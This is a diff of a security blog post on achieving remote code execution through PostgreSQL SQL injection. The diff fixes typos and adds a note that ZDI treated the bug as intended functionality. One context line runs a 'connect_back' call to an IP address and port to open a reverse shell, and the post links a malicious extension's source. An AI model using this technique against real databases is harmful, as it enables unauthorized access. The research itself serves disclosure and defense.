@@ -7,7 +7,7 @@ excerpt_separator: <!--more-->
 ---
 
 <img class="excel" alt="Postgres" src="/assets/images/sql-injection-double-uppercut-how-to-achieve-remote-code-execution/pg.png">
-<p class="cn" markdown="1">When I was researching exploit primitives for the SQL Injection vulnerabilities discovered in [Cisco DCNM](/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html), I came across a generic technique to exploit SQL Injection vulnerabilties against a PostgreSQL database. When developing your exploit primiives, it's always prefered to use an *application technique*, that doesn't rely on some other underlying technology.</p>
+<p class="cn" markdown="1">When I was researching exploit primitives for the SQL Injection vulnerabilities discovered in [Cisco DCNM](/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html), I came across a generic technique to exploit SQL Injection vulnerabilties against a PostgreSQL database. When developing your exploit primitives, it's always prefered to use an *application technique*, that doesn't rely on some other underlying technology.</p>
 
 <!--more-->
 
@@ -15,7 +15,7 @@ excerpt_separator: <!--more-->
 
 <p class="cn" markdown="1">*I share yet another technique to achieve remote code execution against PostgreSQL Database.*</p>
 
-<p class="cn" markdown="1">An application technique would be ability to compromise the database integrity and leverage the trust between the application code and the database. In the case of Cisco DCNM, I found 4 different techniques, 2 of which I blogged about (directory traveral and deserialization).</p>
+<p class="cn" markdown="1">An application technique would be the ability to compromise the database integrity and leverage the trust between the application code and the database. In the case of Cisco DCNM, I found 4 different techniques, 2 of which I blogged about (directory traveral and deserialization).</p>
 
 ## Prior Research
 
@@ -100,6 +100,10 @@ select connect_back('192.168.100.54', 1234);
 - As mentioned, you will need to compile the dll/so file using the same PostgreSQL version including architecture.
 - You can download the extension I used [here](https://github.com/sourceincite/tools/blob/master/pgpwn.c) but you will need to compile it yourself.
 </div>
+
+### Fun Facts
+
+<p class="cn" markdown="1">I initially reported this bug to ZDI which later told me that the vendor wasn't patching it. ZDI didn't release an advisory as zeroday because it is considered intended functionality.</p>
 
 ### Automation
 
